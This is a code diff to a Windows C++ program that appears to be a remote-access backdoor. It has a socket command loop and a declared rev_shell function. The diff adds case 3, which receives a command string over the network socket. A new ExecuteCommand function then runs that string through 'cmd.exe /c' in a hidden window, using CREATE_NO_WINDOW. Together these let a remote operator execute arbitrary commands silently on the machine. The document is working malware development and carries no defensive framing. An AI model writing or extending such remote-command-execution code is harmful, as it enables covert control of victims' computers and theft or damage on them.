@@ -11,14 +11,15 @@ using namespace std;
 #pragma comment(lib, "ws2_32.lib")
 
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-HANDLE hChildStdOutRead, hChildStdOutWrite; // stdout
-HANDLE hChildStdInRead, hChildStdInWrite;   // stdin
+HANDLE hChildStdOutRead, hChildStdOutWrite;                                     // stdout
+HANDLE hChildStdInRead, hChildStdInWrite;                                       // stdin
 SOCKET sock;
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 void send_data(SOCKET clientSocket, const string &data);
 int receive_data_int(SOCKET clientSocket);
 string receive_data(SOCKET clientSocket);
 
+bool ExecuteCommand(const std::string& command);
 void give_command(const std::string &command);
 void rev_shell();
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -74,6 +75,12 @@ int main()
                 break;
             }
 
+            case 3:
+            {                
+                ExecuteCommand(receive_data(sock));
+                break;
+            }
+
             case 0:
             {
                 closesocket(sock);
@@ -86,10 +93,8 @@ int main()
                 break;
             }
         }
-
-
     }
-    //rev_shell();
+
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
     
@@ -99,6 +104,31 @@ int main()
     WSACleanup();
 
     return 0;
+}
+
+bool ExecuteCommand(const std::string& command)
+{
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+
+    // Convert std::string to std::wstring
+    int wlen = MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, NULL, 0);
+    std::wstring wcommand(wlen, L'\0');
+    MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, &wcommand[0], wlen);
+
+    std::wstring cmdLine = L"cmd.exe /c " + wcommand;
+
+    if(!CreateProcessW(NULL,const_cast<wchar_t*>(cmdLine.c_str()),NULL,NULL,FALSE,CREATE_NO_WINDOW, NULL,NULL,&si,&pi))
+    {
+        std::cerr << "CreateProcess failed with error code: " << GetLastError() << std::endl;
+        return false;
+    }             
+
+    // Close process and thread handles. 
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return true;
 }
 
 void give_command(const std::string &command)
